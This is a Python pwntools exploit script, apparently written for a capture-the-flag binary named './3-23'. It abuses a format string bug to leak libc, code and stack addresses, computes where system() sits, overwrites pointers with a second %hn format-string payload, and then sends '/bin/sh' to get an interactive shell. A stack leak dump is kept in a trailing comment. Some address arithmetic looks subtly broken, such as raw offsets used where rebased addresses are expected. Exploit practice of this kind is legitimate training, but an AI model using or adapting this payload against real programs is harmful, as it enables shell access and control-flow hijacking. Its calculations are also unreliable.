# -*- coding: utf-8 -*-
from pwn import *
import re 
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
printf_off=libc.symbols['printf']
system_off=libc.symbols['system']
exit_off=libc.symbols['_exit']
p = process('./3-23')
context.binary='./3-23'
def sl(s,maxSize=0x58):
	print len(s)
	assert(len(s)<maxSize)
	log.info('sendline payload:0x%x::%s'%(len(s),s))

	p.sendline(s)
#0x18
#0x1e
#gdb.attach(p)
#raw_input("die")
payload="%c"*16+"%8c%hhn%6c%20$hhn@(%23$p)@@(%22$p)@@(%18$p)@"
#23for libc 
#19for code
#18for stack
sl(payload)
key=p.recv()
leak_libc,leak_code,leak_stack = re.findall(r'@[(](.*?)[)]@',key)
leak_libc = int(leak_libc,16)
leak_code = int(leak_code,16)
leak_stack = int(leak_stack,16)
log.info('leak_libc=============================>%s',hex(leak_libc))
log.info('leak_code============================>%s',hex(leak_code))
log.info('leak_stack=============================>%s',hex(leak_stack))
#start calculate addr
#libc
#******************************************************
ret_in_libc_main_start=0x7ffff7a42f2a
system_leak=0x7ffff7a63d40
printf_leak=0x7ffff7a775c0
tric=system_leak - ret_in_libc_main_start
system_addr=tric+leak_libc
base=system_addr-system_off
printf_addr=base+printf_off
exit_addr=exit_off+base
#******************************************************
log.info('base===============================>%s',hex(base))
log.info('system=============================>%s',hex(system_addr))
log.info('printf=============================>%s',hex(printf_addr))
log.info('exit===============================>%s',hex(exit_addr))
#******************************************************
#code&date
off=leak_code-0x870
aim=0x2009a2+off
main=off+826
log.info('main===============================>%s',hex(main))
#******************************************************
#hijacking
def lv_up(addr):
	if(addr<0):
		addr=addr+256
	return addr
0x555555554870
main=main&0xffff
system=system_addr&0xffff-main

system2=((system_addr>>16)&0xff)-(system_addr&0xffff)
system2=lv_up(system);
#
payload="%{}c%{}hn%{}c%{}hn%{}c%{}hhn".format(main,11,system,12,system2,13).ljust(0x28,'Y')+p64(exit_off)+p64(printf_off)+p64(printf_off+2)
sl(payload)
log.success("now is starting payload2")
p.recv();
p.sendline("/bin/sh\0")
p.interactive();

#0x7ffff7a63d40
#
#0x7ffff7a775c0
'''
0x7ffc44098200.
0x7fe3dd6798b0.0x1f.0x55f1237202a9.0x7fe3dd87c4c0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x7fe3dd33000a.(nil).(nil).0x7ffc44098270.0x55f122ed0823.0x7ffc44098280.0x55f122ed085c.0x55f122ed0870.0x7fe3dd2e7f2a.(nil).

'''